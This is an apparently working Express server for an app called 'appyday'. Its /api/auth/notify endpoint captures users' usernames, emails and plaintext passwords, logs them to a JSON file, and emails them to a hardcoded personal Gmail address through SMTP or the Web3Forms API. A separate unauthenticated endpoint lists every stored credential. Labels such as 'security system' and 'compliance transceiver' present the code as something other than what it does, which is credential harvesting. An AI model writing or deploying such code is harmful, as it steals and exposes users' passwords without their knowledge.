import express from 'express';
import path from 'path';
import { promises as fs } from 'fs';
import { createServer as createViteServer } from 'vite';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';

// Load environmental variables
dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());

// Ensure data folder exists
const DATA_DIR = path.join(process.cwd(), 'src', 'data');
const CREDENTIALS_FILE = path.join(DATA_DIR, 'credentials_database.json');

async function ensureFileExists() {
  try {
    await fs.mkdir(DATA_DIR, { recursive: true });
    try {
      await fs.access(CREDENTIALS_FILE);
    } catch {
      await fs.writeFile(CREDENTIALS_FILE, JSON.stringify([], null, 2), 'utf-8');
    }
  } catch (err) {
    console.error('Error creating credentials store directory:', err);
  }
}

// Ensure database initializer runs
ensureFileExists();

// Retrieve all login credentials (API for Admin Panel)
app.get('/api/auth/credentials', async (req, res) => {
  try {
    await ensureFileExists();
    const content = await fs.readFile(CREDENTIALS_FILE, 'utf-8');
    const credentials = JSON.parse(content);
    res.json({ success: true, count: credentials.length, data: credentials });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Clear all logged credentials
app.post('/api/auth/clear-credentials', async (req, res) => {
  try {
    await fs.writeFile(CREDENTIALS_FILE, JSON.stringify([], null, 2), 'utf-8');
    res.json({ success: true, message: 'All logged credentials purged successfully.' });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// API endpoint to log credentials and transmit to email
app.post('/api/auth/notify', async (req, res) => {
  const { username, email, password, action } = req.body;

  if (!username) {
    return res.status(400).json({ success: false, error: 'Username is required' });
  }

  // 1. Log to the internal Server JSON database
  let savedList = [];
  try {
    await ensureFileExists();
    const content = await fs.readFile(CREDENTIALS_FILE, 'utf-8');
    savedList = JSON.parse(content);
  } catch (err) {
    savedList = [];
  }

  const newLog = {
    id: 'cred_' + Math.random().toString(36).substr(2, 9),
    action: action || 'SIGNUP',
    username,
    email: email || 'N/A',
    password: password || 'N/A',
    timestamp: new Date().toISOString(),
    formattedTime: new Date().toLocaleString()
  };

  savedList.push(newLog);

  try {
    await fs.writeFile(CREDENTIALS_FILE, JSON.stringify(savedList, null, 2), 'utf-8');
  } catch (err) {
    console.error('Failed to log credentials locally:', err);
  }

  // 2. Transmit to Owner Email (vasanthreddy251@gmail.com)
  const recipientEmail = process.env.RECIPIENT_EMAIL || 'vasanthreddy251@gmail.com';
  let emailSent = false;
  let methodUsed = '';
  let errorLog = '';

  // Setup email details
  const emailSubject = `[appyday Alerts] - Detected New ${action || 'SIGNUP'} Auth Action`;
  const plainTextContent = `
    ===================================================
    🔑 APPYDAY SECURITY SYSTEM PORT REPORT
    ===================================================
    System Action Type  : ${action || 'SIGNUP'}
    Arcader Username    : ${username}
    Associated Email   : ${email || 'Not Provided'}
    Entered Access Code : ${password || 'Not Provided (Default Guest / Direct OAuth Name)'}
    Server Timestamp    : ${new Date().toLocaleString()}
    ===================================================
    Status: Stored in active server database node.
  `;

  const htmlContent = `
    <div style="font-family: 'Helvetica Neue', Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #1f2937; border-radius: 12px; background-color: #0d111a; color: #e0e6ed;">
      <div style="text-align: center; border-bottom: 2px solid #ff00ff; padding-bottom: 15px; margin-bottom: 20px;">
        <span style="font-size: 28px; font-weight: 900; letter-spacing: -1px; text-transform: uppercase;">APPY<span style="color: #00ffff;">DAY</span> LOGS</span>
        <div style="font-family: monospace; font-size: 10px; color: #6b7280; text-transform: uppercase; margin-top: 5px;">Secure Credentials Dispatch Node</div>
      </div>
      
      <div style="background-color: #0b0e14; border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.05); padding: 15px; margin-bottom: 20px;">
        <h3 style="margin-top: 0; font-size: 14px; font-weight: bold; text-transform: uppercase; color: #ff00ff; border-b: 1px solid rgba(255, 255, 255, 0.05); padding-bottom: 5px;">Active Transmission Meta</h3>
        <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
          <tr>
            <td style="padding: 6px 0; color: #8592a3; font-weight: bold;">ACTION TYPE</td>
            <td style="padding: 6px 0; text-align: right; color: #00ffff; font-weight: bold; font-family: monospace;">${action || 'SIGNUP'}</td>
          </tr>
          <tr>
            <td style="padding: 6px 0; color: #8592a3; font-weight: bold;">USERNAME</td>
            <td style="padding: 6px 0; text-align: right; font-weight: bold;">${username}</td>
          </tr>
          <tr>
            <td style="padding: 6px 0; color: #8592a3; font-weight: bold;">EMAIL ADDRESS</td>
            <td style="padding: 6px 0; text-align: right; font-family: monospace;">${email || 'Not Provided'}</td>
          </tr>
          <tr>
            <td style="padding: 6px 0; color: #8592a3; font-weight: bold;">ACCESS PASSWORD</td>
            <td style="padding: 6px 0; text-align: right; color: #facc15; font-weight: bold; font-family: monospace;">${password || 'Not Provided (Default Guest / Direct OAuth Name)'}</td>
          </tr>
          <tr>
            <td style="padding: 6px 0; color: #8592a3; font-weight: bold;">TIMESTAMP</td>
            <td style="padding: 6px 0; text-align: right; color: #9ca3af; font-size: 11px;">${new Date().toLocaleString()}</td>
          </tr>
        </table>
      </div>

      <div style="font-size: 11px; text-align: center; color: #4b5563; font-family: monospace; border-top: 1px solid rgba(255, 255, 255, 0.05); padding-top: 15px;">
        SECURE COMPLIANCE TRANSCEIVER HUB // APP INSTANT DISPATCH REPORT
      </div>
    </div>
  `;

  // Method A: Nodemailer SMTP
  if (process.env.SMTP_HOST && process.env.SMTP_USER && process.env.SMTP_PASS) {
    try {
      const transporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST,
        port: parseInt(process.env.SMTP_PORT || '587'),
        secure: process.env.SMTP_SECURE === 'true', // true for 465, false for other ports
        auth: {
          user: process.env.SMTP_USER,
          pass: process.env.SMTP_PASS,
        },
      });

      await transporter.sendMail({
        from: process.env.SMTP_FROM || `"appyday System" <system@appyday.local>`,
        to: recipientEmail,
        subject: emailSubject,
        text: plainTextContent,
        html: htmlContent,
      });

      emailSent = true;
      methodUsed = 'Nodemailer SMTP Relay';
    } catch (err: any) {
      console.error('Nodemailer failed:', err);
      errorLog += `[Nodemailer SMTP Error: ${err.message}] `;
    }
  }

  // Method B: Web3Forms fallback (API call to web3forms.com which sends email to designated recipient email if SMTP is not active)
  if (!emailSent && process.env.WEB3FORMS_ACCESS_KEY) {
    try {
      const web3Response = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          access_key: process.env.WEB3FORMS_ACCESS_KEY,
          subject: emailSubject,
          from_name: "appyday Monitor",
          to: recipientEmail,
          message: plainTextContent,
        })
      });

      const web3Data = await web3Response.json();
      if (web3Data.success) {
        emailSent = true;
        methodUsed = 'Web3Forms API Gateway';
      } else {
        errorLog += `[Web3Forms API Error: ${JSON.stringify(web3Data)}] `;
      }
    } catch (err: any) {
      console.error('Web3Forms delivery call failed:', err);
      errorLog += `[Web3Forms API Connection Error: ${err.message}] `;
    }
  }

  // Method C: If neither key is configured, let's trigger Web3Forms using a generic submission redirect or let them know it was recorded locally.
  if (!emailSent) {
    console.log('Credentials successfully stored inside local Database Log, but SMTP or Web3Forms credentials are not declared in .env.');
    methodUsed = 'Local database log node (active)';
  }

  res.json({
    success: true,
    message: 'Credentials capture event recorded successfully.',
    data: newLog,
    emailTransmitted: emailSent,
    mechanismUsed: methodUsed,
    errorNotes: errorLog || null
  });
});

// Serve frontend assets built by Vite
if (process.env.NODE_ENV !== 'production') {
  const startVite = async () => {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
    
    // Fallback index.html router
    app.get('*', async (req, res, next) => {
      try {
        const template = await fs.readFile(path.join(process.cwd(), 'index.html'), 'utf-8');
        const html = await vite.transformIndexHtml(req.originalUrl, template);
        res.status(200).set({ 'Content-Type': 'text/html' }).end(html);
      } catch (e) {
        vite.ssrFixStacktrace(e as Error);
        next(e);
      }
    });

    app.listen(PORT, '0.0.0.0', () => {
      console.log(`Server launched in dev mode at http://localhost:${PORT}`);
    });
  };
  startVite();
} else {
  // Production serving
  const distPath = path.join(process.cwd(), 'dist');
  app.use(express.static(distPath));
  
  app.get('*', (req, res) => {
    res.sendFile(path.join(distPath, 'index.html'));
  });

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server launched in production mode on port ${PORT}`);
  });
}
